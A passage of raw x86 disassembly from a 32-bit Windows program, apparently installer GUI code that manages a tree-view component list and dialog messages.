  405078:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40507b:	50                   	push   %eax
  40507c:	6a 00                	push   $0x0
  40507e:	68 3e 11 00 00       	push   $0x113e
  405083:	57                   	push   %edi
  405084:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%ebp)
  40508b:	ff d6                	call   *%esi
  40508d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405090:	5f                   	pop    %edi
  405091:	5e                   	pop    %esi
  405092:	c9                   	leave
  405093:	c2 08 00             	ret    $0x8
  405096:	56                   	push   %esi
  405097:	57                   	push   %edi
  405098:	be 00 a0 42 00       	mov    $0x42a000,%esi
  40509d:	bf 50 2f 42 00       	mov    $0x422f50,%edi
  4050a2:	56                   	push   %esi
  4050a3:	57                   	push   %edi
  4050a4:	e8 33 16 00 00       	call   0x4066dc
  4050a9:	ff 74 24 10          	push   0x10(%esp)
  4050ad:	56                   	push   %esi
  4050ae:	e8 70 15 00 00       	call   0x406623
  4050b3:	ff 74 24 0c          	push   0xc(%esp)
  4050b7:	e8 4f c3 ff ff       	call   0x40140b
  4050bc:	57                   	push   %edi
  4050bd:	56                   	push   %esi
  4050be:	e8 19 16 00 00       	call   0x4066dc
  4050c3:	5f                   	pop    %edi
  4050c4:	5e                   	pop    %esi
  4050c5:	c2 08 00             	ret    $0x8
  4050c8:	55                   	push   %ebp
  4050c9:	8b ec                	mov    %esp,%ebp
  4050cb:	83 ec 54             	sub    $0x54,%esp
  4050ce:	53                   	push   %ebx
  4050cf:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4050d2:	56                   	push   %esi
  4050d3:	8b 35 3c 82 40 00    	mov    0x40823c,%esi
  4050d9:	57                   	push   %edi
  4050da:	68 f9 03 00 00       	push   $0x3f9
  4050df:	53                   	push   %ebx
  4050e0:	ff d6                	call   *%esi
  4050e2:	68 08 04 00 00       	push   $0x408
  4050e7:	53                   	push   %ebx
  4050e8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4050eb:	ff d6                	call   *%esi
  4050ed:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4050f0:	a1 88 9a 42 00       	mov    0x429a88,%eax
  4050f5:	8b 35 58 82 40 00    	mov    0x408258,%esi
  4050fb:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4050fe:	a1 70 9a 42 00       	mov    0x429a70,%eax
  405103:	33 ff                	xor    %edi,%edi
  405105:	05 94 00 00 00       	add    $0x94,%eax
  40510a:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  405111:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405114:	0f 85 25 02 00 00    	jne    0x40533f
  40511a:	a1 8c 9a 42 00       	mov    0x429a8c,%eax
  40511f:	89 7d e0             	mov    %edi,-0x20(%ebp)
  405122:	c1 e0 02             	shl    $0x2,%eax
  405125:	50                   	push   %eax
  405126:	6a 40                	push   $0x40
  405128:	c7 45 f0 02 00 00 00 	movl   $0x2,-0x10(%ebp)
  40512f:	89 1d c0 9a 42 00    	mov    %ebx,0x429ac0
  405135:	ff 15 10 81 40 00    	call   *0x408110
  40513b:	57                   	push   %edi
  40513c:	57                   	push   %edi
  40513d:	57                   	push   %edi
  40513e:	57                   	push   %edi
  40513f:	6a 6e                	push   $0x6e
  405141:	a3 48 2f 42 00       	mov    %eax,0x422f48
  405146:	ff 35 60 9a 42 00    	push   0x429a60
  40514c:	ff 15 44 82 40 00    	call   *0x408244
  405152:	83 0d 3c 2f 42 00 ff 	orl    $0xffffffff,0x422f3c
  405159:	68 d5 56 40 00       	push   $0x4056d5
  40515e:	6a fc                	push   $0xfffffffc
  405160:	8b d8                	mov    %eax,%ebx
  405162:	ff 75 fc             	push   -0x4(%ebp)
  405165:	ff 15 40 82 40 00    	call   *0x408240
  40516b:	57                   	push   %edi
  40516c:	6a 06                	push   $0x6
  40516e:	6a 21                	push   $0x21
  405170:	6a 10                	push   $0x10
  405172:	6a 10                	push   $0x10
  405174:	a3 44 2f 42 00       	mov    %eax,0x422f44
  405179:	ff 15 40 80 40 00    	call   *0x408040
  40517f:	68 ff 00 ff 00       	push   $0xff00ff
  405184:	53                   	push   %ebx
  405185:	50                   	push   %eax
  405186:	a3 34 2f 42 00       	mov    %eax,0x422f34
  40518b:	ff 15 3c 80 40 00    	call   *0x40803c
  405191:	ff 35 34 2f 42 00    	push   0x422f34
  405197:	6a 02                	push   $0x2
  405199:	68 09 11 00 00       	push   $0x1109
  40519e:	ff 75 fc             	push   -0x4(%ebp)
  4051a1:	ff d6                	call   *%esi
  4051a3:	57                   	push   %edi
  4051a4:	57                   	push   %edi
  4051a5:	68 1c 11 00 00       	push   $0x111c
  4051aa:	ff 75 fc             	push   -0x4(%ebp)
  4051ad:	ff d6                	call   *%esi
  4051af:	83 f8 10             	cmp    $0x10,%eax
  4051b2:	7d 0d                	jge    0x4051c1
  4051b4:	57                   	push   %edi
  4051b5:	6a 10                	push   $0x10
  4051b7:	68 1b 11 00 00       	push   $0x111b
  4051bc:	ff 75 fc             	push   -0x4(%ebp)
  4051bf:	ff d6                	call   *%esi
  4051c1:	53                   	push   %ebx
  4051c2:	ff 15 54 80 40 00    	call   *0x408054
  4051c8:	33 db                	xor    %ebx,%ebx
  4051ca:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4051cd:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  4051d0:	3b c7                	cmp    %edi,%eax
  4051d2:	74 27                	je     0x4051fb
  4051d4:	83 fb 20             	cmp    $0x20,%ebx
  4051d7:	74 03                	je     0x4051dc
  4051d9:	89 7d f0             	mov    %edi,-0x10(%ebp)
  4051dc:	50                   	push   %eax
  4051dd:	57                   	push   %edi
  4051de:	e8 36 15 00 00       	call   0x406719
  4051e3:	50                   	push   %eax
  4051e4:	57                   	push   %edi
  4051e5:	68 43 01 00 00       	push   $0x143
  4051ea:	ff 75 f8             	push   -0x8(%ebp)
  4051ed:	ff d6                	call   *%esi
  4051ef:	53                   	push   %ebx
  4051f0:	50                   	push   %eax
  4051f1:	68 51 01 00 00       	push   $0x151
  4051f6:	ff 75 f8             	push   -0x8(%ebp)
  4051f9:	ff d6                	call   *%esi
  4051fb:	43                   	inc    %ebx
  4051fc:	83 fb 21             	cmp    $0x21,%ebx
  4051ff:	7c c9                	jl     0x4051ca
  405201:	8b 5d 14             	mov    0x14(%ebp),%ebx
  405204:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405207:	ff 74 83 30          	push   0x30(%ebx,%eax,4)
  40520b:	6a 15                	push   $0x15
  40520d:	ff 75 08             	push   0x8(%ebp)
  405210:	e8 46 f4 ff ff       	call   0x40465b
  405215:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405218:	ff 74 83 34          	push   0x34(%ebx,%eax,4)
  40521c:	6a 16                	push   $0x16
  40521e:	ff 75 08             	push   0x8(%ebp)
  405221:	e8 35 f4 ff ff       	call   0x40465b
  405226:	33 db                	xor    %ebx,%ebx
  405228:	39 3d 8c 9a 42 00    	cmp    %edi,0x429a8c
  40522e:	89 7d f4             	mov    %edi,-0xc(%ebp)
  405231:	0f 8e ca 00 00 00    	jle    0x405301
  405237:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40523a:	8d 50 08             	lea    0x8(%eax),%edx
  40523d:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  405240:	8d 42 10             	lea    0x10(%edx),%eax
  405243:	66 39 38             	cmp    %di,(%eax)
  405246:	0f 84 97 00 00 00    	je     0x4052e3
  40524c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40524f:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  405252:	8b 02                	mov    (%edx),%eax
  405254:	6a 20                	push   $0x20
  405256:	89 4d ac             	mov    %ecx,-0x54(%ebp)
  405259:	59                   	pop    %ecx
  40525a:	8b d0                	mov    %eax,%edx
  40525c:	c7 45 b0 02 00 ff ff 	movl   $0xffff0002,-0x50(%ebp)
  405263:	23 d1                	and    %ecx,%edx
  405265:	c7 45 b4 0d 00 00 00 	movl   $0xd,-0x4c(%ebp)
  40526c:	a8 02                	test   $0x2,%al
  40526e:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  405271:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  405274:	89 55 bc             	mov    %edx,-0x44(%ebp)
  405277:	74 3a                	je     0x4052b3
  405279:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40527c:	c7 45 b4 4d 00 00 00 	movl   $0x4d,-0x4c(%ebp)
  405283:	50                   	push   %eax
  405284:	57                   	push   %edi
  405285:	68 32 11 00 00       	push   $0x1132
  40528a:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%ebp)
  405291:	ff 75 fc             	push   -0x4(%ebp)
  405294:	ff d6                	call   *%esi
  405296:	8b 0d 48 2f 42 00    	mov    0x422f48,%ecx
  40529c:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  4052a3:	89 04 99             	mov    %eax,(%ecx,%ebx,4)
  4052a6:	a1 48 2f 42 00       	mov    0x422f48,%eax
  4052ab:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  4052ae:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4052b1:	eb 30                	jmp    0x4052e3
  4052b3:	a8 04                	test   $0x4,%al
  4052b5:	74 14                	je     0x4052cb
  4052b7:	ff 75 f4             	push   -0xc(%ebp)
  4052ba:	6a 03                	push   $0x3
  4052bc:	68 0a 11 00 00       	push   $0x110a
  4052c1:	ff 75 fc             	push   -0x4(%ebp)
  4052c4:	ff d6                	call   *%esi
  4052c6:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4052c9:	eb 18                	jmp    0x4052e3
  4052cb:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4052ce:	50                   	push   %eax
  4052cf:	57                   	push   %edi
  4052d0:	68 32 11 00 00       	push   $0x1132
  4052d5:	ff 75 fc             	push   -0x4(%ebp)
  4052d8:	ff d6                	call   *%esi
  4052da:	8b 0d 48 2f 42 00    	mov    0x422f48,%ecx
  4052e0:	89 04 99             	mov    %eax,(%ecx,%ebx,4)
  4052e3:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4052e6:	43                   	inc    %ebx
  4052e7:	81 c2 18 08 00 00    	add    $0x818,%edx
  4052ed:	3b 1d 8c 9a 42 00    	cmp    0x429a8c,%ebx
  4052f3:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  4052f6:	0f 8c 44 ff ff ff    	jl     0x405240
  4052fc:	39 7d e0             	cmp    %edi,-0x20(%ebp)
  4052ff:	75 19                	jne    0x40531a
  405301:	6a f0                	push   $0xfffffff0
  405303:	ff 75 fc             	push   -0x4(%ebp)
  405306:	ff 15 d4 81 40 00    	call   *0x4081d4
  40530c:	24 fb                	and    $0xfb,%al
  40530e:	50                   	push   %eax
  40530f:	6a f0                	push   $0xfffffff0
  405311:	ff 75 fc             	push   -0x4(%ebp)
  405314:	ff 15 40 82 40 00    	call   *0x408240
  40531a:	39 7d f0             	cmp    %edi,-0x10(%ebp)
  40531d:	75 18                	jne    0x405337
  40531f:	6a 05                	push   $0x5
  405321:	ff 75 f8             	push   -0x8(%ebp)
  405324:	ff 15 28 82 40 00    	call   *0x408228
  40532a:	ff 75 f8             	push   -0x8(%ebp)
  40532d:	e8 5e f3 ff ff       	call   0x404690
  405332:	e9 89 03 00 00       	jmp    0x4056c0
  405337:	ff 75 fc             	push   -0x4(%ebp)
  40533a:	e8 51 f3 ff ff       	call   0x404690
  40533f:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  405346:	75 12                	jne    0x40535a
  405348:	33 c9                	xor    %ecx,%ecx
  40534a:	89 7d 10             	mov    %edi,0x10(%ebp)
  40534d:	41                   	inc    %ecx
  40534e:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  405355:	89 4d 14             	mov    %ecx,0x14(%ebp)
  405358:	eb 03                	jmp    0x40535d
  40535a:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40535d:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  405361:	b8 13 04 00 00       	mov    $0x413,%eax
  405366:	74 09                	je     0x405371
  405368:	39 45 0c             	cmp    %eax,0xc(%ebp)
  40536b:	0f 85 e4 00 00 00    	jne    0x405455
  405371:	39 45 0c             	cmp    %eax,0xc(%ebp)
  405374:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  405377:	74 0d                	je     0x405386
  405379:	81 79 04 08 04 00 00 	cmpl   $0x408,0x4(%ecx)
  405380:	0f 85 cf 00 00 00    	jne    0x405455
  405386:	f6 05 79 9a 42 00 02 	testb  $0x2,0x429a79
  40538d:	75 73                	jne    0x405402
  40538f:	39 45 0c             	cmp    %eax,0xc(%ebp)
  405392:	74 09                	je     0x40539d
  405394:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405397:	83 79 08 fe          	cmpl   $0xfffffffe,0x8(%ecx)
  40539b:	75 65                	jne    0x405402
  40539d:	33 c9                	xor    %ecx,%ecx
  40539f:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4053a2:	0f 95 c1             	setne  %cl
  4053a5:	51                   	push   %ecx
  4053a6:	ff 75 fc             	push   -0x4(%ebp)
  4053a9:	e8 68 fc ff ff       	call   0x405016
  4053ae:	8b d8                	mov    %eax,%ebx
  4053b0:	3b df                	cmp    %edi,%ebx
  4053b2:	7c 4e                	jl     0x405402
  4053b4:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  4053ba:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4053bd:	8d 4c 08 08          	lea    0x8(%eax,%ecx,1),%ecx
  4053c1:	8b 01                	mov    (%ecx),%eax
  4053c3:	a8 10                	test   $0x10,%al
  4053c5:	75 3b                	jne    0x405402
  4053c7:	a8 40                	test   $0x40,%al
  4053c9:	74 11                	je     0x4053dc
  4053cb:	35 80 00 00 00       	xor    $0x80,%eax
  4053d0:	84 c0                	test   %al,%al
  4053d2:	79 04                	jns    0x4053d8
  4053d4:	0c 01                	or     $0x1,%al
  4053d6:	eb 07                	jmp    0x4053df
  4053d8:	24 fe                	and    $0xfe,%al
  4053da:	eb 03                	jmp    0x4053df
  4053dc:	83 f0 01             	xor    $0x1,%eax
  4053df:	53                   	push   %ebx
  4053e0:	89 01                	mov    %eax,(%ecx)
  4053e2:	e8 96 bd ff ff       	call   0x40117d
  4053e7:	a1 78 9a 42 00       	mov    0x429a78,%eax
  4053ec:	43                   	inc    %ebx
  4053ed:	f7 d0                	not    %eax
  4053ef:	c1 e8 08             	shr    $0x8,%eax
  4053f2:	83 e0 01             	and    $0x1,%eax
  4053f5:	89 5d 10             	mov    %ebx,0x10(%ebp)
  4053f8:	89 45 14             	mov    %eax,0x14(%ebp)
  4053fb:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  405402:	39 7d f4             	cmp    %edi,-0xc(%ebp)
  405405:	74 4e                	je     0x405455
  405407:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40540a:	81 78 08 3d fe ff ff 	cmpl   $0xfffffe3d,0x8(%eax)
  405411:	75 0e                	jne    0x405421
  405413:	ff 70 5c             	push   0x5c(%eax)
  405416:	57                   	push   %edi
  405417:	68 19 04 00 00       	push   $0x419
  40541c:	ff 75 fc             	push   -0x4(%ebp)
  40541f:	ff d6                	call   *%esi
  405421:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405424:	81 78 08 39 fe ff ff 	cmpl   $0xfffffe39,0x8(%eax)
  40542b:	75 28                	jne    0x405455
  40542d:	83 78 0c 02          	cmpl   $0x2,0xc(%eax)
  405431:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  405434:	8b 40 5c             	mov    0x5c(%eax),%eax
  405437:	75 0f                	jne    0x405448
  405439:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  40543f:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  405443:	83 08 20             	orl    $0x20,(%eax)
  405446:	eb 0d                	jmp    0x405455
  405448:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  40544e:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  405452:	83 20 df             	andl   $0xffffffdf,(%eax)
  405455:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  40545c:	75 6f                	jne    0x4054cd
  40545e:	66 81 7d 10 f9 03    	cmpw   $0x3f9,0x10(%ebp)
  405464:	0f 85 56 02 00 00    	jne    0x4056c0
  40546a:	8b 45 10             	mov    0x10(%ebp),%eax
  40546d:	c1 e8 10             	shr    $0x10,%eax
  405470:	66 3d 01 00          	cmp    $0x1,%ax
  405474:	0f 85 46 02 00 00    	jne    0x4056c0
  40547a:	57                   	push   %edi
  40547b:	57                   	push   %edi
  40547c:	68 47 01 00 00       	push   $0x147
  405481:	ff 75 f8             	push   -0x8(%ebp)
  405484:	ff d6                	call   *%esi
  405486:	83 f8 ff             	cmp    $0xffffffff,%eax
  405489:	0f 84 31 02 00 00    	je     0x4056c0
  40548f:	57                   	push   %edi
  405490:	50                   	push   %eax
  405491:	68 50 01 00 00       	push   $0x150
  405496:	ff 75 f8             	push   -0x8(%ebp)
  405499:	ff d6                	call   *%esi
  40549b:	8b d8                	mov    %eax,%ebx
  40549d:	83 fb ff             	cmp    $0xffffffff,%ebx
  4054a0:	74 08                	je     0x4054aa
  4054a2:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4054a5:	39 3c 98             	cmp    %edi,(%eax,%ebx,4)
  4054a8:	75 03                	jne    0x4054ad
  4054aa:	6a 20                	push   $0x20
  4054ac:	5b                   	pop    %ebx
  4054ad:	53                   	push   %ebx
  4054ae:	e8 e6 bd ff ff       	call   0x401299
  4054b3:	53                   	push   %ebx
  4054b4:	57                   	push   %edi
  4054b5:	68 20 04 00 00       	push   $0x420
  4054ba:	ff 75 08             	push   0x8(%ebp)
  4054bd:	ff d6                	call   *%esi
  4054bf:	83 4d 10 ff          	orl    $0xffffffff,0x10(%ebp)
  4054c3:	89 7d 14             	mov    %edi,0x14(%ebp)
  4054c6:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4054cd:	b8 00 02 00 00       	mov    $0x200,%eax
  4054d2:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4054d5:	75 08                	jne    0x4054df
  4054d7:	57                   	push   %edi
  4054d8:	57                   	push   %edi
  4054d9:	50                   	push   %eax
  4054da:	ff 75 fc             	push   -0x4(%ebp)
  4054dd:	ff d6                	call   *%esi
  4054df:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  4054e6:	75 32                	jne    0x40551a
  4054e8:	a1 34 2f 42 00       	mov    0x422f34,%eax
  4054ed:	3b c7                	cmp    %edi,%eax
  4054ef:	74 07                	je     0x4054f8
  4054f1:	50                   	push   %eax
  4054f2:	ff 15 34 80 40 00    	call   *0x408034
  4054f8:	a1 48 2f 42 00       	mov    0x422f48,%eax
  4054fd:	3b c7                	cmp    %edi,%eax
  4054ff:	74 07                	je     0x405508
  405501:	50                   	push   %eax
  405502:	ff 15 0c 81 40 00    	call   *0x40810c
  405508:	89 3d 34 2f 42 00    	mov    %edi,0x422f34
  40550e:	89 3d 48 2f 42 00    	mov    %edi,0x422f48
  405514:	89 3d c0 9a 42 00    	mov    %edi,0x429ac0
  40551a:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  405521:	0f 85 5b 01 00 00    	jne    0x405682
  405527:	57                   	push   %edi
  405528:	57                   	push   %edi
  405529:	e8 c1 bc ff ff       	call   0x4011ef
  40552e:	8b 45 10             	mov    0x10(%ebp),%eax
  405531:	3b c7                	cmp    %edi,%eax
  405533:	74 0e                	je     0x405543
  405535:	83 f8 ff             	cmp    $0xffffffff,%eax
  405538:	74 01                	je     0x40553b
  40553a:	48                   	dec    %eax
  40553b:	50                   	push   %eax
  40553c:	6a 08                	push   $0x8
  40553e:	e8 53 fb ff ff       	call   0x405096
  405543:	39 7d 14             	cmp    %edi,0x14(%ebp)
  405546:	74 3f                	je     0x405587
  405548:	ff 35 48 2f 42 00    	push   0x422f48
  40554e:	e8 8f bd ff ff       	call   0x4012e2
  405553:	8b d8                	mov    %eax,%ebx
  405555:	53                   	push   %ebx
  405556:	e8 3e bd ff ff       	call   0x401299
  40555b:	33 c0                	xor    %eax,%eax
  40555d:	33 c9                	xor    %ecx,%ecx
  40555f:	3b df                	cmp    %edi,%ebx
  405561:	7e 0e                	jle    0x405571
  405563:	8b 55 e8             	mov    -0x18(%ebp),%edx
  405566:	39 3c 82             	cmp    %edi,(%edx,%eax,4)
  405569:	74 01                	je     0x40556c
  40556b:	41                   	inc    %ecx
  40556c:	40                   	inc    %eax
  40556d:	3b c3                	cmp    %ebx,%eax
  40556f:	7c f2                	jl     0x405563
  405571:	57                   	push   %edi
  405572:	51                   	push   %ecx
  405573:	68 4e 01 00 00       	push   $0x14e
  405578:	ff 75 f8             	push   -0x8(%ebp)
  40557b:	ff d6                	call   *%esi
  40557d:	89 5d 14             	mov    %ebx,0x14(%ebp)
  405580:	c7 45 0c 20 04 00 00 	movl   $0x420,0xc(%ebp)
  405587:	57                   	push   %edi
  405588:	57                   	push   %edi
  405589:	e8 61 bc ff ff       	call   0x4011ef
  40558e:	a1 48 2f 42 00       	mov    0x422f48,%eax
  405593:	39 3d 8c 9a 42 00    	cmp    %edi,0x429a8c
  405599:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40559c:	a1 88 9a 42 00       	mov    0x429a88,%eax
  4055a1:	c7 45 c4 30 f0 00 00 	movl   $0xf030,-0x3c(%ebp)
  4055a8:	89 7d ec             	mov    %edi,-0x14(%ebp)
  4055ab:	0f 8e 9c 00 00 00    	jle    0x40564d
  4055b1:	8d 58 08             	lea    0x8(%eax),%ebx
  4055b4:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4055b7:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4055ba:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  4055bd:	3b c7                	cmp    %edi,%eax
  4055bf:	74 74                	je     0x405635
  4055c1:	8b 0b                	mov    (%ebx),%ecx
  4055c3:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4055c6:	f6 c5 01             	test   $0x1,%ch
  4055c9:	c7 45 b8 08 00 00 00 	movl   $0x8,-0x48(%ebp)
  4055d0:	74 11                	je     0x4055e3
  4055d2:	8d 43 10             	lea    0x10(%ebx),%eax
  4055d5:	c7 45 b8 09 00 00 00 	movl   $0x9,-0x48(%ebp)
  4055dc:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4055df:	80 63 01 fe          	andb   $0xfe,0x1(%ebx)
  4055e3:	f6 c1 40             	test   $0x40,%cl
  4055e6:	74 05                	je     0x4055ed
  4055e8:	6a 03                	push   $0x3
  4055ea:	58                   	pop    %eax
  4055eb:	eb 0e                	jmp    0x4055fb
  4055ed:	8b c1                	mov    %ecx,%eax
  4055ef:	83 e0 01             	and    $0x1,%eax
  4055f2:	40                   	inc    %eax
  4055f3:	f6 c1 10             	test   $0x10,%cl
  4055f6:	74 03                	je     0x4055fb
  4055f8:	83 c0 03             	add    $0x3,%eax
  4055fb:	8b d1                	mov    %ecx,%edx
  4055fd:	ff 75 bc             	push   -0x44(%ebp)
  405600:	c1 e0 0b             	shl    $0xb,%eax
  405603:	83 e2 08             	and    $0x8,%edx
  405606:	0b c2                	or     %edx,%eax
  405608:	8b d1                	mov    %ecx,%edx
  40560a:	c1 f9 05             	sar    $0x5,%ecx
  40560d:	03 c0                	add    %eax,%eax
  40560f:	83 e2 20             	and    $0x20,%edx
  405612:	83 e1 01             	and    $0x1,%ecx
  405615:	0b c2                	or     %edx,%eax
  405617:	41                   	inc    %ecx
  405618:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40561b:	51                   	push   %ecx
  40561c:	68 02 11 00 00       	push   $0x1102
  405621:	ff 75 fc             	push   -0x4(%ebp)
  405624:	ff d6                	call   *%esi
  405626:	8d 45 b8             	lea    -0x48(%ebp),%eax
  405629:	50                   	push   %eax
  40562a:	57                   	push   %edi
  40562b:	68 3f 11 00 00       	push   $0x113f
  405630:	ff 75 fc             	push   -0x4(%ebp)
  405633:	ff d6                	call   *%esi
  405635:	ff 45 ec             	incl   -0x14(%ebp)
  405638:	81 c3 18 08 00 00    	add    $0x818,%ebx
  40563e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405641:	3b 05 8c 9a 42 00    	cmp    0x429a8c,%eax
  405647:	0f 8c 67 ff ff ff    	jl     0x4055b4
  40564d:	66 81 3d 1e 9b 42 00 	cmpw   $0x400,0x429b1e
  405654:	00 04 
  405656:	75 0c                	jne    0x405664
  405658:	6a 01                	push   $0x1
  40565a:	57                   	push   %edi
  40565b:	ff 75 fc             	push   -0x4(%ebp)
  40565e:	ff 15 54 82 40 00    	call   *0x408254
  405664:	a1 3c 8a 42 00       	mov    0x428a3c,%eax
  405669:	39 78 10             	cmp    %edi,0x10(%eax)
  40566c:	74 14                	je     0x405682
  40566e:	6a 05                	push   $0x5
  405670:	e8 74 f9 ff ff       	call   0x404fe9
  405675:	50                   	push   %eax
  405676:	6a fb                	push   $0xfffffffb
  405678:	68 ff 03 00 00       	push   $0x3ff
  40567d:	e8 4f f9 ff ff       	call   0x404fd1
  405682:	81 7d 0c 20 04 00 00 	cmpl   $0x420,0xc(%ebp)
  405689:	75 35                	jne    0x4056c0
  40568b:	f6 05 79 9a 42 00 01 	testb  $0x1,0x429a79
  405692:	74 2c                	je     0x4056c0
  405694:	33 c0                	xor    %eax,%eax
  405696:	83 7d 14 20          	cmpl   $0x20,0x14(%ebp)
  40569a:	8b 35 28 82 40 00    	mov    0x408228,%esi
  4056a0:	0f 94 c0             	sete   %al
  4056a3:	c1 e0 03             	shl    $0x3,%eax
  4056a6:	8b f8                	mov    %eax,%edi
  4056a8:	57                   	push   %edi
  4056a9:	ff 75 fc             	push   -0x4(%ebp)
  4056ac:	ff d6                	call   *%esi
  4056ae:	57                   	push   %edi
  4056af:	68 fe 03 00 00       	push   $0x3fe
  4056b4:	ff 75 08             	push   0x8(%ebp)
  4056b7:	ff 15 3c 82 40 00    	call   *0x40823c
  4056bd:	50                   	push   %eax
  4056be:	ff d6                	call   *%esi
  4056c0:	ff 75 14             	push   0x14(%ebp)
  4056c3:	ff 75 10             	push   0x10(%ebp)
  4056c6:	ff 75 0c             	push   0xc(%ebp)
  4056c9:	e8 f4 ef ff ff       	call   0x4046c2
  4056ce:	5f                   	pop    %edi
  4056cf:	5e                   	pop    %esi
  4056d0:	5b                   	pop    %ebx
  4056d1:	c9                   	leave
  4056d2:	c2 10 00             	ret    $0x10
  4056d5:	55                   	push   %ebp
  4056d6:	8b ec                	mov    %esp,%ebp
  4056d8:	53                   	push   %ebx
  4056d9:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4056dc:	81 fb 02 01 00 00    	cmp    $0x102,%ebx
  4056e2:	57                   	push   %edi
  4056e3:	75 14                	jne    0x4056f9
  4056e5:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  4056e9:	75 59                	jne    0x405744
  4056eb:	68 13 04 00 00       	push   $0x413
  4056f0:	e8 b2 ef ff ff       	call   0x4046a7
  4056f5:	33 c0                	xor    %eax,%eax
  4056f7:	eb 62                	jmp    0x40575b
  4056f9:	81 fb 00 02 00 00    	cmp    $0x200,%ebx
  4056ff:	75 20                	jne    0x405721
  405701:	ff 75 08             	push   0x8(%ebp)
  405704:	ff 15 b4 81 40 00    	call   *0x4081b4
  40570a:	85 c0                	test   %eax,%eax
  40570c:	74 36                	je     0x405744
  40570e:	6a 01                	push   $0x1
  405710:	ff 75 08             	push   0x8(%ebp)
  405713:	e8 fe f8 ff ff       	call   0x405016
  405718:	8b f8                	mov    %eax,%edi
  40571a:	bb 19 04 00 00       	mov    $0x419,%ebx
  40571f:	eb 03                	jmp    0x405724
  405721:	8b 7d 14             	mov    0x14(%ebp),%edi
  405724:	81 fb 19 04 00 00    	cmp    $0x419,%ebx
  40572a:	75 1b                	jne    0x405747
  40572c:	39 3d 3c 2f 42 00    	cmp    %edi,0x422f3c
  405732:	74 13                	je     0x405747
  405734:	57                   	push   %edi
  405735:	6a 06                	push   $0x6
  405737:	89 3d 3c 2f 42 00    	mov    %edi,0x422f3c
  40573d:	e8 54 f9 ff ff       	call   0x405096
  405742:	eb 03                	jmp    0x405747
  405744:	8b 7d 14             	mov    0x14(%ebp),%edi
  405747:	57                   	push   %edi
  405748:	ff 75 10             	push   0x10(%ebp)
  40574b:	53                   	push   %ebx
  40574c:	ff 75 08             	push   0x8(%ebp)
  40574f:	ff 35 44 2f 42 00    	push   0x422f44
  405755:	ff 15 b8 81 40 00    	call   *0x4081b8
  40575b:	5f                   	pop    %edi
  40575c:	5b                   	pop    %ebx
  40575d:	5d                   	pop    %ebp
  40575e:	c2 10 00             	ret    $0x10
  405761:	55                   	push   %ebp
  405762:	8b ec                	mov    %esp,%ebp
  405764:	83 ec 30             	sub    $0x30,%esp
  405767:	a1 44 8a 42 00       	mov    0x428a44,%eax
  40576c:	53                   	push   %ebx
  40576d:	56                   	push   %esi
  40576e:	57                   	push   %edi
  40576f:	33 ff                	xor    %edi,%edi
  405771:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405774:	3b c7                	cmp    %edi,%eax
  405776:	0f 84 b1 00 00 00    	je     0x40582d
  40577c:	8b 1d 14 9b 42 00    	mov    0x429b14,%ebx
  405782:	be 30 1f 42 00       	mov    $0x421f30,%esi
  405787:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40578a:	83 e3 01             	and    $0x1,%ebx
